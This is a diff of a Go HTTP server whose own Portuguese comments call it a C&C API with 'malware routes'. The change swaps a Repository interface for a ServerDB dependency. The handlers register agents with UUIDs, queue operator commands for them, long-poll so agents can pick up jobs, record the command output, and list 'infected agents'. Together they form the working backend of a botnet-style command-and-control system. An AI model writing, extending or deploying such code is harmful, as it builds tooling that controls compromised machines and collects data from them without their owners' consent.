@@ -23,25 +23,25 @@ type UpdateJobResultRequest struct {
 	Output string `json:"output"`
 }
 
-// Repository exige os métodos que o Servidor precisa para funcionar
-type Repository interface {
-	SaveAgent(agent domain.AgentRow) error
-	SaveJob(job domain.JobRow) error // Adicionamos a exigência de salvar o comando
-	GetJobForAgent(agentID string) (domain.JobRow, error) // Novo método
-	GetJob(id string) (domain.JobRow, error) 
-	UpdateJob(job domain.JobRow) error
-	GetAllJobs() ([]domain.JobRow, error) 
-	GetAllAgents() ([]domain.AgentRow, error)
-}
+// // Repository exige os métodos que o Servidor precisa para funcionar
+// type Repository interface {
+// 	SaveAgent(agent domain.AgentRow) error
+// 	SaveJob(job domain.JobRow) error // Adicionamos a exigência de salvar o comando
+// 	GetJobForAgent(agentID string) (domain.JobRow, error) // Novo método
+// 	GetJob(id string) (domain.JobRow, error) 
+// 	UpdateJob(job domain.JobRow) error
+// 	GetAllJobs() ([]domain.JobRow, error) 
+// 	GetAllAgents() ([]domain.AgentRow, error)
+// }
 
 // ServerHTTP é a nossa API C&C
 type ServerHTTP struct {
-	repo Repository
+	serverDB domain.ServerDB
 }
 
 // NewServerHTTP constrói a API injetando o banco de dados
-func NewServerHTTP(repo Repository) *ServerHTTP {
-	return &ServerHTTP{repo: repo}
+func NewServerHTTP(serverDB domain.ServerDB) *ServerHTTP {
+	return &ServerHTTP{serverDB: serverDB}
 }
 
 // Router configura todas as rotas do malware
@@ -64,7 +64,7 @@ func (s *ServerHTTP) handleGiveAnUUIDForAgentRequest(w http.ResponseWriter, r *h
 	newUUID := uuid.NewString()
 	agentRow := domain.NewAgentRow(newUUID)
 
-	if err := s.repo.SaveAgent(agentRow); err != nil {
+	if err := s.serverDB.SaveAgent(agentRow); err != nil {
 		http.Error(w, "Erro ao registrar agente", http.StatusInternalServerError)
 		return
 	}
@@ -88,7 +88,7 @@ func (s *ServerHTTP) handleReceiveCommand(w http.ResponseWriter, r *http.Request
 	jobRow := domain.NewJobRow(req.AgentID, req.Command, req.Args)
 
 	// 3. Chamada ao Cofre (Service/Repository Layer)
-	if err := s.repo.SaveJob(jobRow); err != nil {
+	if err := s.serverDB.SaveJob(jobRow); err != nil {
 		http.Error(w, "Erro ao salvar comando", http.StatusInternalServerError)
 		return
 	}
@@ -113,7 +113,7 @@ func (s *ServerHTTP) handleSendJobs(w http.ResponseWriter, r *http.Request) {
 
 	// Long Polling: O C&C "prende" o Agente por até 5 segundos procurando comandos
 	for i := 0; i < 5; i++ {
-		jobRow, err := s.repo.GetJobForAgent(agentID)
+		jobRow, err := s.serverDB.GetJobForAgent(agentID)
 		
 		if err == nil {
 			// Sucesso! Achamos um comando. Despachamos imediatamente pro Agente.
@@ -144,7 +144,7 @@ func (s *ServerHTTP) handleReceiveJobResult(w http.ResponseWriter, r *http.Reque
 	}
 
 	// 2. Busca a Entidade original no banco
-	jobRow, err := s.repo.GetJob(req.JobID)
+	jobRow, err := s.serverDB.GetJob(req.JobID)
 	if err != nil {
 		http.Error(w, "Comando não encontrado", http.StatusNotFound)
 		return
@@ -156,7 +156,7 @@ func (s *ServerHTTP) handleReceiveJobResult(w http.ResponseWriter, r *http.Reque
 	jobRow.Output = &req.Output    // Preenche com o que veio do JSON
 
 	// 4. Salva a Entidade atualizada no banco
-	if err := s.repo.UpdateJob(jobRow); err != nil {
+	if err := s.serverDB.UpdateJob(jobRow); err != nil {
 		http.Error(w, "Erro ao atualizar resultado", http.StatusInternalServerError)
 		return
 	}
@@ -167,7 +167,7 @@ func (s *ServerHTTP) handleReceiveJobResult(w http.ResponseWriter, r *http.Reque
 
 // handleSendAllJobResults lista todos os comandos para o Operador
 func (s *ServerHTTP) handleSendAllJobResults(w http.ResponseWriter, r *http.Request) {
-	jobs, err := s.repo.GetAllJobs()
+	jobs, err := s.serverDB.GetAllJobs()
 	if err != nil {
 		http.Error(w, "Erro ao buscar comandos", http.StatusInternalServerError)
 		return
@@ -195,7 +195,7 @@ func (s *ServerHTTP) handleSendAllJobResults(w http.ResponseWriter, r *http.Requ
 func (s *ServerHTTP) handleSendJobResult(w http.ResponseWriter, r *http.Request) {
 	jobID := r.PathValue("job_id") // Extrai o ID da URL
 
-	job, err := s.repo.GetJob(jobID)
+	job, err := s.serverDB.GetJob(jobID)
 	if err != nil {
 		http.Error(w, "Comando não encontrado", http.StatusNotFound)
 		return
@@ -218,7 +218,7 @@ func (s *ServerHTTP) handleSendJobResult(w http.ResponseWriter, r *http.Request)
 
 // handleSendAvailableAgents lista todos os agentes infectados para o Operador
 func (s *ServerHTTP) handleSendAvailableAgents(w http.ResponseWriter, r *http.Request) {
-	agents, err := s.repo.GetAllAgents()
+	agents, err := s.serverDB.GetAllAgents()
 	if err != nil {
 		http.Error(w, "Erro ao buscar agentes", http.StatusInternalServerError)
 		return
